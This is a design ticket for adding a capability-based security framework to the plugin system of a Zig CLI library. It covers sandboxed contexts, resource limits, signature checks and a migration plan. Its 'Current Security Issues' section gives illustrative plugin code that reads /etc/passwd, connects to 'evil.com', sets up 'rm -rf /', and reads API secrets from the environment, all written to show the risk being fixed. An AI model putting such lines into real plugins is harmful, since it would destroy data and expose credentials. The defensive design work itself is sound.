# Ticket 05: Implement Plugin Security Framework

## Priority
🔴 **Critical**

## Component
`src/plugin_types.zig`, `src/registry.zig`, plugin system

## Description
The current plugin system allows arbitrary code execution with full system privileges, creating significant security risks. Plugins have unrestricted access to filesystem, network, processes, and sensitive data without any capability restrictions or sandboxing.

## Current Security Issues

### 1. Unrestricted System Access
```zig
// Plugins can do anything the host application can do
pub fn execute(ctx: *zcli.Context, args: anytype) !void {
    // Can access any file
    const file = try std.fs.openFileAbsolute("/etc/passwd", .{});
    
    // Can make network connections
    const socket = try std.net.tcpConnectToHost(allocator, "evil.com", 80);
    
    // Can execute processes
    var child = std.process.Child.init(&.{"rm", "-rf", "/"}, allocator);
}
```

### 2. No Plugin Verification
- No signature verification for plugin authenticity
- No version compatibility checking
- No plugin integrity validation
- No trusted source verification

### 3. Unrestricted Context Access
```zig
// Plugins have full access to all context data
pub fn preParse(context: *zcli.Context, args: [][]const u8) ![][]const u8 {
    // Can read all environment variables including secrets
    const secret = context.environment.get("API_SECRET");
    
    // Can access all global options including sensitive data
    const api_key = context.getGlobalOption([]const u8, "api_key");
    
    // Can modify context state arbitrarily
    context.command_path = &.{"malicious", "command"};
}
```

## Proposed Security Framework

### 1. Capability-Based Security
```zig
pub const PluginCapabilities = struct {
    // File system access
    filesystem_read: []const []const u8 = &.{},  // Allowed paths
    filesystem_write: []const []const u8 = &.{}, // Allowed paths
    
    // Network access
    network_outbound: []const []const u8 = &.{}, // Allowed hosts/IPs
    network_inbound: bool = false,
    
    // Process execution
    process_execute: []const []const u8 = &.{},  // Allowed programs
    
    // Environment access
    environment_read: []const []const u8 = &.{}, // Allowed env vars
    environment_write: bool = false,
    
    // Context access
    context_read_globals: []const []const u8 = &.{}, // Allowed global options
    context_modify_state: bool = false,
    
    // System resources
    max_memory_bytes: usize = 1024 * 1024,  // 1MB default
    max_execution_time_ms: u64 = 1000,      // 1 second default
};
```

### 2. Plugin Declaration
```zig
// In plugin source
pub const plugin_info = PluginInfo{
    .name = "my-plugin",
    .version = "1.0.0",
    .author = "trusted-dev",
    .description = "Safe plugin example",
    .capabilities = PluginCapabilities{
        .filesystem_read = &.{"~/.myapp/config"},
        .network_outbound = &.{"api.myservice.com"},
        .environment_read = &.{"HOME", "USER"},
        .context_read_globals = &.{"verbose", "config"},
    },
};
```

### 3. Security Context Wrapper
```zig
pub const SecureContext = struct {
    inner: *zcli.Context,
    capabilities: PluginCapabilities,
    plugin_name: []const u8,
    
    pub fn getGlobalOption(self: *@This(), comptime T: type, key: []const u8) ?T {
        // Check if plugin is allowed to access this global
        for (self.capabilities.context_read_globals) |allowed| {
            if (std.mem.eql(u8, key, allowed)) {
                return self.inner.getGlobalOption(T, key);
            }
        }
        
        // Log security violation
        std.log.warn("Plugin '{s}' attempted unauthorized access to global '{s}'", 
                    .{self.plugin_name, key});
        return null;
    }
    
    pub fn openFile(self: *@This(), path: []const u8, flags: std.fs.File.OpenFlags) !std.fs.File {
        const abs_path = try std.fs.realpathAlloc(self.inner.allocator, path);
        defer self.inner.allocator.free(abs_path);
        
        // Check if path is allowed
        for (self.capabilities.filesystem_read) |allowed| {
            if (std.mem.startsWith(u8, abs_path, allowed)) {
                return self.inner.fs.openFile(path, flags);
            }
        }
        
        return error.AccessDenied;
    }
};
```

### 4. Plugin Registry with Security
```zig
pub fn registerSecurePlugin(comptime Plugin: type) void {
    // Compile-time capability validation
    const info = Plugin.plugin_info;
    
    // Verify capabilities don't exceed security limits
    comptime {
        if (info.capabilities.max_memory_bytes > MAX_PLUGIN_MEMORY) {
            @compileError("Plugin requests too much memory: " ++ @typeName(Plugin));
        }
        
        if (info.capabilities.max_execution_time_ms > MAX_PLUGIN_TIME) {
            @compileError("Plugin requests too much execution time: " ++ @typeName(Plugin));
        }
    }
    
    // Register with security wrapper
    plugin_registry[@typeInfo(Plugin).Struct.name] = SecurePluginWrapper{
        .plugin = Plugin,
        .capabilities = info.capabilities,
    };
}
```

### 5. Runtime Security Enforcement
```zig
pub fn executeSecurePlugin(plugin: *SecurePluginWrapper, context: *zcli.Context) !void {
    // Create resource monitors
    const start_time = std.time.milliTimestamp();
    const start_memory = getCurrentMemoryUsage();
    
    // Create secure context
    var secure_ctx = SecureContext{
        .inner = context,
        .capabilities = plugin.capabilities,
        .plugin_name = plugin.info.name,
    };
    
    // Execute with monitoring
    defer {
        const elapsed = std.time.milliTimestamp() - start_time;
        const memory_used = getCurrentMemoryUsage() - start_memory;
        
        // Log resource usage for monitoring
        std.log.debug("Plugin '{s}' used {d}ms, {d}bytes", 
                     .{plugin.info.name, elapsed, memory_used});
        
        // Check for violations
        if (elapsed > plugin.capabilities.max_execution_time_ms) {
            std.log.warn("Plugin '{s}' exceeded time limit", .{plugin.info.name});
        }
        if (memory_used > plugin.capabilities.max_memory_bytes) {
            std.log.warn("Plugin '{s}' exceeded memory limit", .{plugin.info.name});
        }
    }
    
    try plugin.plugin.execute(&secure_ctx);
}
```

## Implementation Plan

### Phase 1: Core Security Framework (2 weeks)
- [ ] Define `PluginCapabilities` structure
- [ ] Implement `SecureContext` wrapper
- [ ] Create basic capability checking
- [ ] Update plugin registration process

### Phase 2: Resource Monitoring (1 week)
- [ ] Implement memory usage tracking
- [ ] Add execution time monitoring
- [ ] Create resource limit enforcement
- [ ] Add security violation logging

### Phase 3: Advanced Security (2 weeks)
- [ ] Implement file system path validation
- [ ] Add network access controls
- [ ] Create process execution controls
- [ ] Environment variable access controls

### Phase 4: Plugin Verification (1 week)
- [ ] Add plugin signature verification
- [ ] Implement version compatibility checking
- [ ] Create trusted source validation
- [ ] Add plugin integrity validation

## Configuration API

### Application Security Policy
```zig
// In build.zig
const cmd_registry = zcli.build(b, exe, zcli_module, .{
    .security_policy = .{
        .plugin_security_enabled = true,
        .max_plugin_memory = 1024 * 1024 * 5,  // 5MB per plugin
        .max_plugin_time_ms = 5000,             // 5 seconds max
        .require_plugin_signatures = false,     // Development mode
        .allowed_plugin_sources = &.{"builtin", "trusted-vendor"},
    },
});
```

### Runtime Security Settings
```zig
// Environment-based security controls
const security_enabled = std.posix.getenv("ZCLI_PLUGIN_SECURITY") != null;
const strict_mode = std.posix.getenv("ZCLI_STRICT_PLUGINS") != null;
```

## Backward Compatibility Strategy

### Migration Path
1. **Phase 1**: Security framework optional, warnings only
2. **Phase 2**: Security enabled by default in debug builds
3. **Phase 3**: Security required in release builds
4. **Phase 4**: Remove insecure plugin support

### Plugin Migration
```zig
// Plugins can migrate gradually
pub const plugin_info = PluginInfo{
    .security_version = 1,  // Indicates security-aware plugin
    .capabilities = if (@hasDecl(@This(), "SECURE_PLUGIN")) 
        secure_capabilities 
    else 
        legacy_all_access_capabilities,  // Temporary compatibility
};
```

## Testing Strategy

### Security Testing
- [ ] Attempt unauthorized file system access
- [ ] Test network access restrictions
- [ ] Verify memory and time limits
- [ ] Test privilege escalation attempts
- [ ] Fuzzing with malicious plugin code

### Compatibility Testing
- [ ] Verify existing plugins continue to work
- [ ] Test migration path from insecure to secure
- [ ] Performance impact measurement
- [ ] Integration testing with various plugin types

## Impact Assessment
- **Security**: Dramatically reduces attack surface from plugins
- **Compatibility**: Existing plugins may need capability declarations
- **Performance**: Small overhead for security checks (~1-2%)
- **Development**: Plugin developers need to understand capability model

## Acceptance Criteria
- [ ] Plugins cannot access unauthorized resources
- [ ] Clear error messages for capability violations
- [ ] Resource limits enforced effectively
- [ ] Migration path preserves existing functionality
- [ ] Security violations logged appropriately
- [ ] Performance impact < 2% for normal operations

## Estimated Effort
**6-8 weeks** (distributed across phases with testing and refinement)